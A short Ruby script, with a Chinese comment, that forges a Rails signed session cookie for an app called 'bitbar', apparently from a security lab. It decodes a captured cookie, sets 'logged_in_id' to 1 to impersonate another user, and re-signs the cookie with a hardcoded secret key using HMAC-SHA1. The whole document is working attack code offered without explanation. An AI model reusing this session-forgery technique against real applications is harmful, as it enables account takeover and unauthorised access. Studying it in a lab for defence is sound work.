#!/usr/bin/env ruby
require 'openssl'
require 'base64'
SESSION = '_bitbar_session'
RAILS_SECRET = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'
# 浏览器中获取到的 Cookie 值
cookie="BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTRmZGRmNTEwYmM1YjhjYmQ3Zjk0YWEwNWY4MzhmNzEwBjsAVEkiCnRva2VuBjsARkkiG2NITldzR1BhcGdkVkNydWI1eGhSVFEGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkJ--feb53fcc9e1f9ea7cb579cb32f8e16584e22f3d9"

cookie_value, cookie_signature = cookie.split('--')
raw_session = Base64.decode64(cookie_value)
session = Marshal.load(raw_session)

session['logged_in_id'] = 1
cookie_value = Base64.encode64(Marshal.dump(session)).split.join
cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)
cookie_full = "#{SESSION}=#{cookie_value}--#{cookie_signature}"

puts cookie_full
